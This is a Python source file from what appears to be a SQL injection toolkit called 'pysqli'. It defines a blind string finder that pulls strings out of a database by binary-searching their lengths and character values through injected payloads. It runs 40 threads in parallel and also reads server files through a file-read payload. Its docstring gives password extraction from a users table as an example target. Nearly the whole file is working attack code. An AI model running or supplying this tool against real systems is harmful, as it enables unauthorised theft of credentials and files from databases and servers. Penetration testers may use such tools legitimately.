import time
from multiprocessing.pool import ThreadPool
from threading import Thread

from pysqli.blind_tester import BlindTester
from pysqli.payloads import MysqlPayloads
from pysqli.percent_display import PercentDisplay
from pysqli.string_finder import StringFinder
from pysqli.tools import *


class BlindStringFinder(StringFinder):
    """
    String finder based on the blind technique.
    """

    def __init__(self, tester: BlindTester, payloads=MysqlPayloads()):
        """
        Create a BlindTester based on a BlindTester
        :param tester: BlindTester
        :param payloads payloads collection
        """
        self.pd = None
        self.tester = tester
        self.payloads = payloads
        self.partial_counter = 0
        self.stop = False

    def search_length(self, sql, a, b):
        if a == b:
            return a
        if b - a == 1:
            if self.tester.test(self.payloads.and_size_eq.format(sql, b)):
                return b
            else:
                return a
        pivot = int((a + b) / 2)
        # print("[*] pivot : {} / {}-{}".format(pivot,a, b))
        if self.tester.test(self.payloads.and_size_lt.format(sql, pivot)):
            return self.search_length(sql, a, pivot)
        else:
            return self.search_length(sql, pivot, b)

    def str_length(self, sql):
        i = 1
        while not self.tester.test(self.payloads.and_size_lt.format(sql, i)):
            i *= 2
        # print("[*] LENGTH({}) > i".format(sql, i))
        return self.search_length(sql, int(i / 2), i)

    def search_char(self, sql, i, a, b):
        if a == b:
            return a
        if b - a == 1:
            if self.tester.test(self.payloads.and_char_at_is.format(sql, i, b)):
                return b
            else:
                return a
        pivot = int((a + b) / 2)
        # print("[*] pivot : {} / {}-{}".format(pivot,a, b))
        if self.tester.test(self.payloads.and_char_at_lt.format(sql, i, pivot)):
            return self.search_char(sql, i, a, pivot)
        else:
            return self.search_char(sql, i, pivot, b)

    def read_string(self, sql):
        """
        Read a string via the blind technique.
        The search is multithreaded.
        Use parentheses if possible ("(SELECT version())" in place of "SELECT version()")
        see SqliEncoder to encode the string if quotes are not possibles.

        :param sql: sql code to read.
                    examples :  - (SELECT pass FROM users LIMIT 1 OFFSET 2)
                                - (SELECT version())

        :return:
        """
        if self.tester.test(self.payloads.and_size_gt.format(sql, 0)):
            length = self.str_length(sql)
            with ThreadPool(40) as pool:
                self.start_update_display(length)
                import threading
                thread_lock = threading.Lock()

                def f(i):
                    char = chr(self.search_char(sql, i, 10, 127))
                    with thread_lock:
                        self.partial_counter += 1
                    return char

                finded_str = ''.join(pool.map(f, range(0, length)))
                self.stop_update_display()
                self.pd.end()
                return finded_str
        else:
            print("[-] string {} do not exist or is null".format(sql))

    def read_file(self, filename):
        """
        Read a file via the read_string technique.

        :param filename: name of the file to read
        :return:
        """
        return self.read_string(self.payloads.str_file.format(encode_str(filename)))

    def start_update_display(self, total):
        self.stop = False
        self.pd = PercentDisplay(total)
        self.pd.init_display()

        def f():
            while not self.stop:
                time.sleep(.5)
                self.pd.update_display(self.partial_counter)

        self.display_thread = Thread(None, f)
        self.display_thread.start()

    def stop_update_display(self):
        self.stop = True
        self.display_thread.join()
